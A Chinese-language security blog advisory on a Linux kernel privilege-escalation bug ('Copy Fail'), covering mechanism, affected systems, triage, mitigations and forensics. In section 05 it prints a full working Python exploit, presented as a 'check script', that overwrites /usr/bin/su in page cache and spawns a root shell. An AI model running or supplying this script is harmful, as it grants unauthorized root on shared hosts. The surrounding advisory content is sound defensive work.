#  Linux Copy Fail漏洞预警，丝滑提权不是梦  
原创 千里
                    千里  东方隐侠安全团队   2026-04-30 04:50  
  
各位少侠，中午好，我是千里。  
  
今天火爆圈内的Linux 内核的 CVE-2026-31431 值得重点看一下。这个漏洞的利用条件是攻击者需要先在机器上有一个低权限执行入口，然后可以通过利用漏洞丝滑提权，从攻击链的角度来说，该漏洞日后将会成为后渗透的必备利用点。  
  
比如共享开发机、跳板机、CI runner、构建服务器、Kubernetes 节点、在线 Notebook、沙箱服务、AI Agent 执行环境，只要允许用户代码、脚本、容器或任务在同一个内核上跑，本地提权就不是“本地小问题”，而是可能变成宿主机、节点、流水线和多租户环境的问题。  
  
这个漏洞被公开命名为 Copy Fail。官方 CVE 评分是 7.8，高危。本质上是 Linux kernel crypto 子系统里algifaead/authencesn  
相关逻辑问题，攻击者可以通过AF  
ALG和splice()组  
合，把一次本来应该失败的加密操作，变成对文件页缓存的可控写入。研究方已经公开了 PoC，并验证了多种主流发行版。  
  
因此，我在这里先给出结论：  
  
1.有多用户、多租户、容器、CI、沙箱、AI 执行任务的 Linux 机器，应当优先排查。  
  
2.仅靠文件完整性校验不一定能发现问题，因为攻击打的是 page cache，不是直接改磁盘文件。  
  
3.最可靠的修复方式是升级内核或安装发行版安全补丁。  
  
4.无法立即升级时，可以临时禁用algif aead或限制AF ALG socket 创建，但要先评估业务是否使用 AF_ALG。  
  
检查脚本请见第五章。  
  
![](https://mmecoa.qpic.cn/mmecoa_png/p7HuDKJB4T17hmgN4ia9GQKG4cKp1tBh6oJW3VxeuBxnh3lPjT9ibFFJCOouHNxa9C3plmiceqkqYta4Ap41IEfLw/640?wx_fmt=png&from=appmsg "")  
         
漏洞基本信息  
  
01  
  
  
<table><thead><tr><th data-colwidth="102" style="border: 1px solid #ddd;padding: 8px;text-align: left;background-color: #f2f2f2;"><section><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">项目</span></section></th><th style="border: 1px solid #ddd;padding: 8px;text-align: left;background-color: #f2f2f2;"><section><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">内容</span></section></th></tr></thead><tbody><tr><th data-colwidth="102" style="border: 1px solid #ddd;padding: 8px;text-align: left;"><section><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">CVE</span></section></th><td style="border: 1px solid #ddd;padding: 8px;text-align: left;"><section><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">CVE-2026-31431</span></section></td></tr><tr><th data-colwidth="102" style="border: 1px solid #ddd;padding: 8px;text-align: left;"><section><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">名称</span></section></th><td style="border: 1px solid #ddd;padding: 8px;text-align: left;"><section><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">Copy Fail</span></section></td></tr><tr><th data-colwidth="102" style="border: 1px solid #ddd;padding: 8px;text-align: left;"><section><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">影响组件</span></section></th><td style="border: 1px solid #ddd;padding: 8px;text-align: left;"><section><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">Linux kernel crypto /`algif_aead`/`authencesn`</span></section></td></tr><tr><th data-colwidth="102" style="border: 1px solid #ddd;padding: 8px;text-align: left;"><section><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">漏洞类型</span></section></th><td style="border: 1px solid #ddd;padding: 8px;text-align: left;"><section><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">本地提权 / page cache 可控写入</span></section></td></tr><tr><th data-colwidth="102" style="border: 1px solid #ddd;padding: 8px;text-align: left;"><section><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">CVSS</span></section></th><td style="border: 1px solid #ddd;padding: 8px;text-align: left;"><section><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">7.8 High</span></section></td></tr><tr><th data-colwidth="102" style="border: 1px solid #ddd;padding: 8px;text-align: left;"><section><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">攻击条件</span></section></th><td style="border: 1px solid #ddd;padding: 8px;text-align: left;"><section><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">本地低权限执行，不需要用户交互</span></section></td></tr><tr><th data-colwidth="102" style="border: 1px solid #ddd;padding: 8px;text-align: left;"><section><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">典型影响</span></section></th><td style="border: 1px solid #ddd;padding: 8px;text-align: left;"><section><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">低权限用户提权到 root；容器、CI、沙箱场景可能扩大为节点级风险</span></section></td></tr><tr><th data-colwidth="102"><section><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">影响版本</span></section></th><td><p style="margin: 0px 0px 10px;" data-pm-slice="0 0 []"><strong style="color: rgb(0, 82, 255);font-weight: 600;"><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">已知受影响的操作系统及版本：</span></strong></p><ul style="padding-left: 28px;margin: 0px 0px 14px;" class="list-paddingleft-1"><li style="margin-bottom: 6px;"><section><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">Ubuntu 24.04 LTS</span></section></li><li style="margin-bottom: 6px;"><section><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">Amazon Linux 2023</span></section></li><li style="margin-bottom: 6px;"><section><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">Red Hat Enterprise Linux 10</span></section></li><li style="margin-bottom: 6px;"><section><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">Red Hat Enterprise Linux 9</span></section></li><li style="margin-bottom: 6px;"><section><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">Red Hat Enterprise Linux 8</span></section></li><li style="margin-bottom: 6px;"><section><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">SUSE 16</span></section></li></ul><p style="margin: 0px 0px 10px;"><strong style="color: rgb(0, 82, 255);font-weight: 600;"><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">受影响的内核提交范围：</span></strong></p><ul style="padding-left: 28px;margin: 0px 0px 14px;" class="list-paddingleft-1"><li style="margin-bottom: 6px;"><section><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">72548b093ee3 &lt;= commit &lt; a664bf3d603d</span></section></li></ul></td></tr><tr><th data-colwidth="102" style="border: 1px solid #ddd;padding: 8px;text-align: left;"><section><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">官方修复</span></section></th><td style="border: 1px solid #ddd;padding: 8px;text-align: left;"><section><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">回退algif_aead in-place 操作，恢复 out-of-place 处理。</span></section><section><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">安全版本：commit &gt;= a664bf3d603d</span></section><h3 style="font-size: 16px;font-weight: 700;color: rgb(26, 26, 26);margin: 22px 0px 10px;line-height: 1.4;" data-pm-slice="0 0 []"><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">官方补丁升级</span></h3><p style="margin: 0px 0px 14px;text-indent: 2em;"><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">官方已发布漏洞补丁及修复版本，请评估业务是否受影响后，升级至安全版本。</span></p><ul style="padding-left: 28px;margin: 0px 0px 14px;" class="list-paddingleft-1"><li style="margin-bottom: 6px;"><section><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">补丁链接：</span><span style="word-break: break-all;"><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5</span></span></section></li></ul><p style="margin: 0px 0px 14px;text-indent: 2em;"><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">针对 Ubuntu、Red Hat Enterprise Linux 等用户，发行版官方暂未全部发布安全更新，请及时关注官方安全公告：</span></p><ul style="padding-left: 28px;margin: 0px 0px 14px;" class="list-paddingleft-1"><li style="margin-bottom: 6px;"><section><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">Ubuntu 安全公告：</span><span style="word-break: break-all;"><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">https://ubuntu.com/security/CVE-2026-31431</span></span></section></li><li style="margin-bottom: 6px;"><section><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">Red Hat 安全公告：</span><span style="word-break: break-all;"><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">https://access.redhat.com/security/cve/cve-2026-31431</span></span></section></li></ul><h3 style="font-size: 16px;font-weight: 700;color: rgb(26, 26, 26);margin: 22px 0px 10px;line-height: 1.4;"><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">缓解措施</span></h3><p style="margin: 0px 0px 14px;text-indent: 2em;"><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">若暂时无法升级内核，可禁用 </span><code style="background: rgb(243, 244, 246);padding: 1px 6px;border-radius: 3px;font-family: SFMono-Regular, Consolas, monospace;font-size: 14px;color: rgb(0, 82, 255);"><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">algif_aead</span></code><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;"> 内核模块：</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" mpa-preserve="t" mpa-from-tpl="t" data-mpa-action-id="mokzufvn15gv"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(248, 248, 248);color: rgb(51, 51, 51);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;"><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">echo &#34;</span><span style="color: rgb(51, 51, 51);background: rgba(0, 0, 0, 0);display: inline;width: 50px;text-decoration: none;font-weight: 700;font-style: normal;"><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">install</span></span><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;"> algif_aead /</span><span style="color: rgb(51, 51, 51);background: rgba(0, 0, 0, 0);display: inline;width: 22px;text-decoration: none;font-weight: 700;font-style: normal;"><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">bin</span></span><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">/</span><span style="color: rgb(0, 128, 128);background: rgba(0, 0, 0, 0);display: inline;width: 36px;text-decoration: none;font-weight: 400;font-style: normal;"><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">false</span></span><span style="color: rgb(221, 17, 68);background: rgba(0, 0, 0, 0);display: inline;width: 308px;text-decoration: none;font-weight: 400;font-style: normal;"><span leaf="" style="color: rgb(51, 51, 51);font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">&#34; &gt; /etc/modprobe.d/disable-algif-aead.conf</span></span></code></pre></section></td></tr></tbody></table>  
  
官方 CVE 记录显示，问题与 2017 年引入的algif_aead in-place 优化有关。受影响范围从 Linux kernel 4.14 开始，修复进入 6.18.22、6.19.12、7.0 等版本线。  
  
这里要注意一点：企业排查时不要只看主线版本号。很多发行版会 backport 补丁，内核版本字符串可能看起来没有到官方修复版本，但补丁已经回填；也可能版本看起来接近，但供应商还没发布修复包。最终要以发行版安全公告和实际补丁状态为准。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/AwziaxUyibcNgZNqE1FzG6WbRlnFUVmKQRzYdOWOEgib9DYw4497wjYrhqs2HC1W8hXhVGUuXxZSS5CFaian1bZRZCbMRic7OD5LT4o1XZw7VTXA/640?wx_fmt=gif&from=appmsg "")  
![]( "")  
  
  
![](https://mmecoa.qpic.cn/mmecoa_png/p7HuDKJB4T17hmgN4ia9GQKG4cKp1tBh6oJW3VxeuBxnh3lPjT9ibFFJCOouHNxa9C3plmiceqkqYta4Ap41IEfLw/640?wx_fmt=png&from=appmsg "")  
         
为什么这个本地漏洞值得重视  
  
02  
  
  
不是所有本地提权漏洞都要拉响同样等级的警报。Copy Fail 值得重视，主要有几个原因。  
  
第一，利用路径比较稳定。研究方描述它不是传统 race condition，不需要抢窗口，也不依赖每个发行版不同的内核偏移。公开信息里已经说明，同一思路在 Ubuntu、Amazon Linux、RHEL、SUSE 等环境上完成过验证。  
  
第二，影响面和现代执行环境贴得很近。现在很多系统都会运行不完全可信的代码：CI 跑外部 PR，容器平台跑租户任务，AI Agent 帮用户执行脚本，Notebook 让用户跑代码。这些场景里，攻击者未必一开始就是 root，但只要能拿到普通代码执行，本地提权就可能成为下一跳。  
  
第三，它改的是 page cache。文件在磁盘上不一定被改，传统基于磁盘 hash 的完整性校验可能看不到变化。但进程实际读取和执行文件时，读到的是内存里的页缓存。这个点会让检测和取证都更麻烦。  
  
第四，已有公开 PoC 和衍生样本。你给到的 Python 脚本很短，核心就是利用AFALG、authencesn和splice()组合，把一段小的 ELF 内容按 4 字节写入/usr/bin/su的页缓存，然后执行目标二进制拿到 root shell。你补充的 S3 文件我也只做了静态识别，它是一个约 890KB 的静态链接 ELF，字符串里能看到socket(AF  
ALG)、splice(file -> pipe)、bind(AF_ALG: authencesn...)、/usr/bin/su、/bin/sh等痕迹。这说明公开 PoC 之外，已经有人在整理更方便运行的二进制形态。  
  
  
![](https://mmecoa.qpic.cn/mmecoa_png/p7HuDKJB4T17hmgN4ia9GQKG4cKp1tBh6oJW3VxeuBxnh3lPjT9ibFFJCOouHNxa9C3plmiceqkqYta4Ap41IEfLw/640?wx_fmt=png&from=appmsg "")  
         
漏洞利用原理：一次失败的解密，为什么会改到文件缓存  
  
03  
  
![Diagram titled “Linux Kernel Crypto Subsystem AEAD Request Handling” with source/destination mapping and ciphertext flow.](https://mmbiz.qpic.cn/mmbiz_jpg/AwziaxUyibcNjBicZDJk3D2yib6aBibU9Teh8JibsCnIlzLgrDapNbpHfhxukr9rlnkhXR84tJFYsG5XgEKsxcy4OQz9koQSsbqfReubWGttr8u4I/640?wx_fmt=other&from=appmsg "")  
  
这个漏洞的关键，不在“加密算法被破解”，而在内核处理数据路径时，把不该写的页缓存页放进了可写位置。  
  
可以把利用链拆成四步。  
  
第一步，攻击者从用户态打开AFALG socket，选择 authencesn(hmac(sha256),cbc(aes))这一类 AEAD 模板。AF  
ALG本来是 Linux 暴露给用户态使用内核 crypto 能力的接口，普通用户也可以触达。  
  
第二步，攻击者借助splice()把一个可读文件的数据送进 crypto 操作链路。splice()的特点是尽量避免复制，它会让管道和目标接口直接引用文件的 page cache。也就是说，进入 scatterlist 的不只是普通用户缓冲区，还可能是某个文件在内存里的缓存页。  
  
第三步，algif_aead的 in-place 优化把 source 和 destination 放到同一条处理链上。原本这类优化是为了少拷贝，但在这里，文件 page cache 引用被链到了一个后续可能被写的位置。  
  
第四步，authencesn在处理 ESN 相关字节时，会使用 destination buffer 当临时 scratch 空间，并在认证检查失败之前写入 4 个字节。正常情况下，这种临时写入不该碰到文件页缓存；但在前面的 in-place 路径下，这 4 字节可能落到被splice()带进来的文件 page cache 上。  
  
最后的结果就是：解密请求可以失败，但写入已经发生。攻击者可以重复这个过程，在可控偏移写入可控的 4 字节。公开 PoC 选择的是 setuid 程序，因为这类程序一旦被页缓存层面临时修改，后续执行时就可能走到攻击者想要的逻辑，进而提权。  
  
这也是为什么研究方把它叫 Copy Fail：本来应该是安全的数据拷贝和处理，最后“拷贝错了地方”，把写入带到了不该被写的页缓存。  
  
  
![](https://mmecoa.qpic.cn/mmecoa_png/p7HuDKJB4T17hmgN4ia9GQKG4cKp1tBh6oJW3VxeuBxnh3lPjT9ibFFJCOouHNxa9C3plmiceqkqYta4Ap41IEfLw/640?wx_fmt=png&from=appmsg "")  
         
哪些环境优先排查  
  
04  
  
  
优先级最高的是  
“低权限代码经常跑、并且共享同一个内核”的环境。  
  
第一类是 Kubernetes 和容器平台。容器隔离共享宿主机内核，page cache 也在宿主机层面共享。如果容器里能触发相关 primitive，就要考虑节点级风险。  
  
第二类是 CI/CD 和构建系统。自建 GitHub Actions runner、GitLab runner、Jenkins agent、构建农场，如果会执行外部 PR、第三方代码、供应链任务，这个漏洞会把“普通构建用户”变成高危入口。  
  
第三类是共享开发机、跳板机、运维工具机。只要多个用户共享一台机器，本地提权的风险就会被放大。  
  
第四类是 AI Agent、Notebook、代码沙箱和在线实验环境。现在很多 AI 工具会帮用户执行脚本、跑测试、装依赖、拉仓库。这类环境如果没有足够强的内核隔离和权限收敛，就需要特别关注。  
  
第五类是普通服务器。单租户业务服务器不是第一优先级，但如果存在 Web RCE、弱口令、被盗凭据、低权限落点，Copy Fail 可能成为攻击链里的提权步骤。  
  
  
![](https://mmecoa.qpic.cn/mmecoa_png/p7HuDKJB4T17hmgN4ia9GQKG4cKp1tBh6oJW3VxeuBxnh3lPjT9ibFFJCOouHNxa9C3plmiceqkqYta4Ap41IEfLw/640?wx_fmt=png&from=appmsg "")  
         
应急排查建议  
  
05  
  
  
第一，先做资产分层。  
  
把 Linux 机器按风险场景分出来：容器节点、CI runner、共享开发机、跳板机、沙箱/Notebook、AI Agent 执行机、普通业务机。不要一上来平均用力，先看哪里最可能跑不可信代码。  
  
第二，确认内核和发行版修复状态。  
  
查看当前内核版本和发行版信息：  
```
uname -r
cat /etc/os-release
```  
  
然后去对应发行版安全公告里确认是否已经合入 CVE-2026-31431 修复。不要只靠主线版本号做最终判断。  
  
第三，确认algifaead和 AF  
ALG 使用情况。  
  
可以检查模块是否存在或已加载：  
```
lsmod | grep algif_aead
modinfo algif_aead 2>/dev/null
```  
  
也可以观察系统里是否有 AF_ALG 使用痕迹：  
```
ss -xa | grep -i alg
lsof 2>/dev/null | grep AF_ALG
```  
  
这些命令不等价于漏洞验证，只是帮助判断系统是否可能使用相关接口。  
  
第四，尽快安装内核补丁并重启。  
  
内核漏洞最终还是要靠内核更新解决。升级后需要确认实际运行内核已经切换，而不是只安装了包但没有重启。  
  
第五，无法立即升级时做临时缓解。  
  
如果确认业务不依赖`algif_aead`，可以临时禁用模块：  
```
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif-aead.conf
rmmod algif_aead 2>/dev/null || true
```  
  
容器和沙箱环境还可以考虑通过 seccomp 限制AF_ALG socket 创建。这个动作更适合平台侧统一做，尤其是运行不可信代码的节点。  
  
注意：临时缓解要先评估影响。大多数常规加密场景并不走 AFALG 用户态接口，但少数显式使用 AF  
ALG 的应用、嵌入式加速场景、特殊 crypto offload 方案可能受影响。  
  
最后，提供检验脚本：  
  
```
#!/usr/bin/env python3
import os as g,zlib,socket as s
def d(x):return bytes.fromhex(x)
def c(f,t,c):
 a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
 try:u.recv(8+t)
 except:0
f=g.open("/usr/bin/su",0);i=0;e=zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
while i<len(e):c(f,i,e[i:i+4]);i+=4
g.system("su")
```  
  
  
也可参考：  
  
  
https://github.com/rootsecdev/cve_2026_31431  
  
  
![](https://mmecoa.qpic.cn/mmecoa_png/p7HuDKJB4T17hmgN4ia9GQKG4cKp1tBh6oJW3VxeuBxnh3lPjT9ibFFJCOouHNxa9C3plmiceqkqYta4Ap41IEfLw/640?wx_fmt=png&from=appmsg "")  
         
检测和取证要注意什么  
  
06  
  
  
这个漏洞最麻烦的一点，是 page cache 写入不一定反映到磁盘文件。  
  
所以，单纯对磁盘文件做 hash 校验，可能会得出“文件没变”的结论，但当时实际执行的内存页已经被改过。对于疑似被利用的机器，不能只看文件完整性结果。  
  
建议重点关注：  
- 低权限用户突然执行 setuid 程序后获得 root 行为。  
  
- Python 或未知二进制短时间内大量触发AF_ALG、splice()、sendmsg()、recvmsg()相关行为。  
  
- 容器内普通用户对宿主机节点产生异常影响。  
  
- CI runner、沙箱、Notebook、Agent 执行机上出现不符合任务预期的 root shell、持久化、账号变更、sudoers 修改、SSH key 写入。  
  
如果怀疑已经被利用，建议直接按主机入侵处理：隔离机器、保存内存和关键日志、重启清理页缓存影响、检查持久化痕迹、轮换可能被读取的凭据。虽然 page cache 改动本身可能不落盘，但攻击者拿到 root 后做的后续动作可能已经落盘。  
  
  
![](https://mmecoa.qpic.cn/mmecoa_png/p7HuDKJB4T17hmgN4ia9GQKG4cKp1tBh6oJW3VxeuBxnh3lPjT9ibFFJCOouHNxa9C3plmiceqkqYta4Ap41IEfLw/640?wx_fmt=png&from=appmsg "")  
         
几个容易误判的地方  
  
07  
  
  
第一，这不是远程 RCE。没有本地执行入口，不能直接从公网打进来。  
  
第二，这也不是低优先级小洞。只要你的环境允许别人以普通用户身份运行代码，它就可能变成高危问题。  
  
第三，不要把容器当成天然隔离边界。容器共享宿主机内核，这类漏洞正好打在内核边界上。  
  
第四，不要只看磁盘文件 hash。这个漏洞的特殊点就在 page cache。  
  
第五，不要在生产环境跑公开 PoC。PoC 会触碰 setuid 程序的页缓存，即使声称不持久，也可能导致系统状态异常，更不用说后续 root shell 带来的风险。  
  
  
![](https://mmecoa.qpic.cn/mmecoa_png/p7HuDKJB4T17hmgN4ia9GQKG4cKp1tBh6oJW3VxeuBxnh3lPjT9ibFFJCOouHNxa9C3plmiceqkqYta4Ap41IEfLw/640?wx_fmt=png&from=appmsg "")  
         
处置优先级  
  
08  
  
  
可以按下面顺序排：  
1. 运行不可信代码的 Kubernetes 节点、CI runner、沙箱、Notebook、AI Agent 执行机。  
  
1. 多用户共享的开发机、跳板机、构建机。  
  
1. 对外业务服务器，尤其是历史上出现过 Web RCE、命令执行、弱口令、文件上传风险的机器。  
  
1. 普通单用户终端和单租户内部服务器。  
  
这次漏洞真正提醒我们的，不只是 Linux kernel 又出了一个 LPE。  
  
更重要的是，现在很多系统都在主动给用户、插件、流水线、Agent 提供“执行能力”。以前本地提权可能离攻击者很远，现在一段 CI 脚本、一个容器任务、一次 AI Agent 自动执行，就可能把攻击者带到本地低权限位置。  
  
所以，看这类漏洞不能只问“是不是远程”。还要问：我们的系统里，谁能跑代码？跑在哪里？和谁共享内核？能不能碰 setuid 程序？能不能触发 AF_ALG？出了事能不能复盘？  
  
这些问题答清楚，才是真正的安全预警。  
  
  
![](https://mmecoa.qpic.cn/mmecoa_png/p7HuDKJB4T17hmgN4ia9GQKG4cKp1tBh6oJW3VxeuBxnh3lPjT9ibFFJCOouHNxa9C3plmiceqkqYta4Ap41IEfLw/640?wx_fmt=png&from=appmsg "")  
         
参考资料  
  
09  
  
- CVE 官方记录：https://www.cve.org/CVERecord?id=CVE-2026-31431  
  
- CVE JSON 记录：https://cveawg.mitre.org/api/cve/CVE-2026-31431  
  
- Copy Fail 页面：https://copy.fail/  
  
- Xint 技术分析：https://xint.io/blog/copy-fail-linux-distributions  
  
- oss-security 讨论：https://www.openwall.com/lists/oss-security/2026/04/29/23  
  
- Linux stable 修复提交：  
  
- https://git.kernel.org/stable/c/fafe0fa2995a0f7073c1c358d7d3145bcc9aedd8  
  
- https://git.kernel.org/stable/c/ce42ee423e58dffa5ec03524054c9d8bfd4f6237  
  
- https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5  
  
作者：东方隐侠安全团队 千里  
- 欢迎关注我们的公众号、CSDN、视频号、BiliBili账号  
  
- 如您有意加入我的安全私域圈子，可扫码加入，我会和我的智能体一起用心地经营这一方天地  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/AwziaxUyibcNgdOUkNrUib3wQatsCicRGjf7Mibia7Ux8toibw33ibdtmAvvmYGBGpRZRSBrExFYVyhWoteAqZnvEhTwcibDVDIBJWzb4TrVr7HsSKKg/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
  
